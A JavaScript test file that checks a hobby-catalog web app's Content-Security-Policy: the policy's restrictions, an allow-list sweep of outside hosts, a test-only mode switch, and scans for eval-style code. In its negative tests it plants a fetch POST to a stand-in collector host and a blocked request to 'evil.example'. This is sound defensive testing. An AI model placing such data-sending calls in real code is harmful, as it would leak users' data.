// ════════════════════════════════════════════════════════════════════════
// csp_tests.js — v0.9.1906 (security review #7, [stated] Brad "yes" 2026-10-09)
//
// THE CONTENT-SECURITY-POLICY. One copy, in index.html's <script id="rr-csp">.
// Step 1 (v0.9.1906): applied only in a tab opened with ?csp=test, with a
// recorder, so it can be walked through in a real browser before anyone else
// gets it. Step 2: on for everyone.
//
//   A. the policy keeps its locks (no plugins, no <base> hijack, no eval, no
//      bare wildcard, frames only from Google sign-in).
//   B. THE SWEEP: every outside address the app's code names is either ALLOWED
//      by the policy or on LINK_ONLY (pages the user is sent to — the policy
//      does not govern those). A new address fails here until it is placed.
//      Script loads are held tighter: their host must be in script-src.
//   C. the mode switch, run for real: no flag → nothing changes; ?csp=test →
//      the policy goes on for that tab; ?csp=off → off again.
//   D. the guards can fail: a planted new address and a planted script load
//      from an unlisted site both go red.
// ════════════════════════════════════════════════════════════════════════
'use strict';
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const APPDIR = path.join(__dirname, '..', 'app');
const HTML = fs.readFileSync(path.join(APPDIR, 'index.html'), 'utf8');

let pass = 0, fail = 0;
function ok(name, cond, detail) {
  if (cond) { pass++; console.log('  PASS  ' + name); }
  else { fail++; console.log('  FAIL  ' + name + (detail !== undefined ? '  -> ' + JSON.stringify(detail) : '')); }
}
function section(t) { console.log('\n== ' + t + ' =='); }

// ── the one copy ────────────────────────────────────────────────────────
const blockM = HTML.match(/<script id="rr-csp">([\s\S]*?)<\/script>/);
const BLOCK = blockM ? blockM[1] : '';
function policyOf(block) {
  const box = { window: {}, location: { search: '' }, sessionStorage: { getItem: () => null, setItem() {}, removeItem() {} }, document: { head: { appendChild() {} }, createElement: () => ({}), addEventListener() {} }, console: { info() {}, warn() {} } };
  box.window = box;
  vm.createContext(box);
  vm.runInContext(block, box);
  return box.RR_CSP || '';
}
const POLICY = BLOCK ? policyOf(BLOCK) : '';
function directives(p) {
  const d = {};
  p.split(';').map(s => s.trim()).filter(Boolean).forEach(s => { const parts = s.split(/\s+/); d[parts[0]] = parts.slice(1); });
  return d;
}
const D = directives(POLICY);
function allows(list, host) {
  return (list || []).some(src => {
    if (src === 'https:') return true;
    const m = src.match(/^https:\/\/(.+)$/); if (!m) return false;
    const h = m[1].replace(/\/.*$/, '');
    if (h.startsWith('*.')) return host.endsWith(h.slice(1)) && host !== h.slice(2);
    return host === h;
  });
}

section('A. one policy, and it keeps its locks');
ok('the policy block is in index.html', !!BLOCK && POLICY.length > 100, POLICY.slice(0, 80));
ok('it is the FIRST thing in <head> after the charset (so it governs everything after it)', /<meta charset="UTF-8">\s*<!--[\s\S]*?-->\s*<script id="rr-csp">/.test(HTML.slice(0, 4000)));
const copies = fs.readdirSync(APPDIR).filter(f => /\.(js|html)$/.test(f)).reduce((n, f) => n + (fs.readFileSync(path.join(APPDIR, f), 'utf8').match(/object-src 'none'/g) || []).length, 0);
ok('there is ONE copy of the policy in app/', copies === 1, copies);
ok("default-src 'self'", (D['default-src'] || []).join(' ') === "'self'", D['default-src']);
ok("object-src 'none' (no plugins)", (D['object-src'] || []).join(' ') === "'none'");
ok("base-uri 'self' (no <base> hijack)", (D['base-uri'] || []).join(' ') === "'self'");
ok('form-action is set (forms can only go to us or Google sign-in)', !!D['form-action'] && D['form-action'].every(s => s === "'self'" || s === 'https://accounts.google.com'), D['form-action']);
ok("no 'unsafe-eval' anywhere (wasm gets its own narrow 'wasm-unsafe-eval')", POLICY.indexOf("'unsafe-eval'") < 0);
ok('no bare * source anywhere', !/(^|\s)\*(\s|;|$)/.test(POLICY));
ok('script-src names no blob:, data: or https: wildcard', !(D['script-src'] || []).some(s => s === 'blob:' || s === 'data:' || s === 'https:'), D['script-src']);
ok('connect-src has no https: wildcard (data can only be sent to listed sites)', !(D['connect-src'] || []).includes('https:'), D['connect-src']);
ok('frames only from Google sign-in', (D['frame-src'] || []).join(' ') === 'https://accounts.google.com', D['frame-src']);

// ── B. the sweep ────────────────────────────────────────────────────────
// Pages the user is SENT to (a link, a new tab, a share) and picture hosts
// (img-src allows any https picture — catalog photos come from many makers).
// The page never runs code from or sends data to these, so the policy does
// not list them — but each is placed here on purpose.
const LINK_ONLY = [
  'drive.google.com', 'docs.google.com', 'sheets.google.com', 'mail.google.com', 'gmail.com', 'www.google.com',
  'lens.google.com', 'maps.google.com', 'maps.apple.com', 'console.cloud.google.com', 'developers.google.com',
  'therailroster.com', 'cornucopiaoftoytrains.com', 'www.ebay.com', 'www.trainz.com', 'www.lionelcollectors.org',
  'www.youtube.com', 'www.atlasrr.com', 'shop.atlasrr.com', 'download.atlasrr.com', 'www.lionelsupport.com',
  'www.lionelstore.com', 'www.lionel.com', 'www.lgb.com', 'www.get3rparts.com', 'static.maerklin.de',
  'reindeerpass.com', 'mthpartsandsales.com', 'estore.bachmanntrains.com', 'd2frr7198pxftr.cloudfront.net',
  'greenberg-books.example', 'cott.somewhere',
];
function hostsIn(files) {
  const out = {};
  files.forEach(f => {
    let src = typeof f === 'string' ? fs.readFileSync(path.join(APPDIR, f), 'utf8') : f.src;
    const name = typeof f === 'string' ? f : f.name;
    if (name === 'index.html') src = src.replace(/<script id="rr-csp">[\s\S]*?<\/script>/, '');
    const re = /https:\/\/([a-zA-Z0-9.-]+\.[a-z]{2,})/g;
    let m;
    while ((m = re.exec(src))) (out[m[1]] = out[m[1]] || new Set()).add(name);
  });
  return out;
}
function loadedScripts(files) {
  const out = [];
  files.forEach(f => {
    const src = typeof f === 'string' ? fs.readFileSync(path.join(APPDIR, f), 'utf8') : f.src;
    const name = typeof f === 'string' ? f : f.name;
    const res = [/<script[^>]+src="https:\/\/([^/"]+)/g, /\.src\s*=\s*'https:\/\/([^/']+)/g, /import\(\s*['"]https:\/\/([^/'"]+)/g, /_ZXING_ESM\s*=\s*['"]https:\/\/([^/'"]+)/g];
    res.forEach(re => { let m; while ((m = re.exec(src))) out.push({ file: name, host: m[1] }); });
  });
  return out;
}
const FILES = fs.readdirSync(APPDIR).filter(f => /\.js$/.test(f) && f !== 'sw.js').concat(['index.html']);
const LOADS = [].concat(D['script-src'] || [], D['connect-src'] || [], D['style-src'] || [], D['font-src'] || [], D['frame-src'] || []);
function placed(host) { return allows(LOADS, host) || LINK_ONLY.indexOf(host) >= 0; }

section('B. every outside address is allowed or listed as a link');
const H = hostsIn(FILES);
const hosts = Object.keys(H).sort();
ok('found the app\'s outside addresses (scan sanity)', hosts.length >= 30, hosts.length);
hosts.forEach(h => ok(h + ' is placed', placed(h), [...H[h]]));
LINK_ONLY.forEach(h => ok('LINK_ONLY "' + h + '" is not also loaded (no double listing)', !allows(LOADS, h)));
ok('every LINK_ONLY entry is still named in the code (no dead entries)', LINK_ONLY.every(h => H[h]), LINK_ONLY.filter(h => !H[h]));
const scripts = loadedScripts(FILES);
ok('found the app\'s outside script loads (scan sanity: sign-in, jsPDF, Cropper, Tesseract, ExcelJS, zxing)', scripts.length >= 5, scripts);
scripts.forEach(s => ok('script from ' + s.host + ' (' + s.file + ') is allowed by script-src', allows(D['script-src'], s.host), s));
ok('the photo reader\'s OCR data host is allowed to be fetched', allows(D['connect-src'], 'tessdata.projectnaptha.com') && allows(D['connect-src'], 'cdn.jsdelivr.net'));
ok('the Vault relay and its answer host are allowed', allows(D['connect-src'], 'script.google.com') && allows(D['connect-src'], 'script.googleusercontent.com'));
ok('the Google APIs (Sheets, Drive, Photos picker) are allowed', ['sheets.googleapis.com', 'www.googleapis.com', 'photospicker.googleapis.com'].every(h => allows(D['connect-src'], h)));

// ── C. the mode switch, for real ────────────────────────────────────────
section('C. the mode switch (step 1: test tabs only)');
function tab(search, stored) {
  const ss = { o: Object.assign({}, stored || {}), getItem(k) { return k in this.o ? this.o[k] : null; }, setItem(k, v) { this.o[k] = String(v); }, removeItem(k) { delete this.o[k]; } };
  const added = [], listeners = {};
  const box = {
    location: { search }, sessionStorage: ss, console: { info() {}, warn() {} },
    document: { head: { appendChild: el => added.push(el) }, createElement: t => ({ tag: t }), addEventListener: (k, f) => { listeners[k] = f; } },
  };
  box.window = box;
  vm.createContext(box);
  vm.runInContext(BLOCK, box);
  return { box, added, listeners, ss };
}
{
  const t = tab('');
  ok('an ordinary visit: no policy, no recorder (exactly as before)', t.added.length === 0 && !t.listeners.securitypolicyviolation && t.box.RR_CSP_ON === false);
  const t2 = tab('?csp=test');
  ok('?csp=test: the policy goes on, as a CSP meta tag holding exactly the one policy', t2.added.length === 1 && t2.added[0].httpEquiv === 'Content-Security-Policy' && t2.added[0].content === POLICY);
  ok('…the recorder listens', typeof t2.listeners.securitypolicyviolation === 'function');
  t2.listeners.securitypolicyviolation({ effectiveDirective: 'connect-src', blockedURI: 'https://evil.example/x', sourceFile: 'app.js', lineNumber: 9 });
  ok('…and a blocked request lands in window._rrCspLog', (t2.box._rrCspLog || []).length === 1 && t2.box._rrCspLog[0].directive === 'connect-src');
  const t3 = tab('', t2.ss.o);
  ok('a reload in that tab keeps the policy on (remembered for the tab)', t3.added.length === 1);
  const t4 = tab('?csp=off', t2.ss.o);
  ok('?csp=off: off again', t4.added.length === 0 && t4.box.RR_CSP_ON === false);
  ok('a flag that is merely similar does nothing (?csp=tested)', tab('?csp=tested').added.length === 0);
}

// ── E. no code built from text (the policy has no 'unsafe-eval') ────────
section("E. no code built from text anywhere in the app");
function textCode(files) {
  const out = [];
  files.forEach(f => {
    const raw = typeof f === 'string' ? fs.readFileSync(path.join(APPDIR, f), 'utf8') : f.src;
    const name = typeof f === 'string' ? f : f.name;
    raw.split('\n').forEach((line, i) => {
      const code = line.replace(/\/\/.*$/, '');
      if (/new Function\s*\(|(^|[^\w$.])eval\s*\(|set(Timeout|Interval)\(\s*['"`]/.test(code)) out.push(name + ':' + (i + 1) + ' ' + line.trim().slice(0, 70));
    });
  });
  return out;
}
const TEXT_CODE = textCode(fs.readdirSync(APPDIR).filter(f => /\.js$/.test(f)));
ok('no new Function / eval / setTimeout("…") in app/*.js', TEXT_CODE.length === 0, TEXT_CODE);
ok('a planted new Function is caught', textCode([{ name: 'p.js', src: "  new Function(call).call(window);" }]).length === 1);
ok('a planted string timer is caught', textCode([{ name: 'p.js', src: "setTimeout('go()', 10);" }]).length === 1);
{
  // the Prev/Next arrows, run for real: the row's call text is compiled as an
  // inline handler (stand-in browser: setAttribute('onclick') compiles it)
  const NAV = fs.readFileSync(path.join(APPDIR, 'detail-nav.js'), 'utf8');
  const box = { console: { warn() {} }, showToast: (m) => { box.toast = m; }, scrollTo() {}, ran: [] };
  box.window = box;
  box.document = {
    addEventListener() {}, querySelector: () => null, getElementById: () => null,
    createElement: () => { const el = { setAttribute(k, v) { if (k === 'onclick') { try { el.onclick = box.__compile(v); } catch (e) { el.onclick = null; } } } }; return el; },
  };
  vm.createContext(box);
  box.__compile = vm.runInContext("(function (v) { return new Function('event', v); })", box);   // the page's own realm, like a browser
  vm.runInContext(NAV, box);
  box._rrNav = { items: [{ label: 'a', call: "ran.push('a')" }, { label: 'b', call: "ran.push('b:' + (this === window))" }, { label: 'c', call: "this is not code(" }], pos: 0, origin: 'probe' };
  box.rrDetailNavGo(1);
  ok('Next runs the next row\'s own call, with window as `this` (as before)', box.ran.join() === 'b:true' && box._rrNav.pos === 1, box.ran);
  box.rrDetailNavGo(1);
  ok('a call that will not compile shows the toast instead of failing silently', /Could not open that item/.test(box.toast || ''), box.toast);
}

// ── D. the guards can fail ─────────────────────────────────────────────
section('D. the guards can fail');
{
  const planted = hostsIn([{ name: 'planted.js', src: "fetch('https://collector-stats.example.net/up', { method: 'POST' })" }]);
  ok('a planted new address is NOT placed (B would be red)', Object.keys(planted).length === 1 && !placed(Object.keys(planted)[0]), Object.keys(planted));
  const ps = loadedScripts([{ name: 'planted.js', src: "var s = document.createElement('script'); s.src = 'https://unpkg.com/thing@1/x.js';" }]);
  ok('a planted script load from an unlisted site is NOT allowed (B would be red)', ps.length === 1 && !allows(D['script-src'], ps[0].host), ps);
  ok('a policy with a bare * would fail A', /(^|\s)\*(\s|;|$)/.test(POLICY.replace("default-src 'self'", 'default-src *')));
}

console.log('\n' + pass + ' passed, ' + fail + ' failed  (csp_tests)');
process.exit(fail ? 1 : 0);
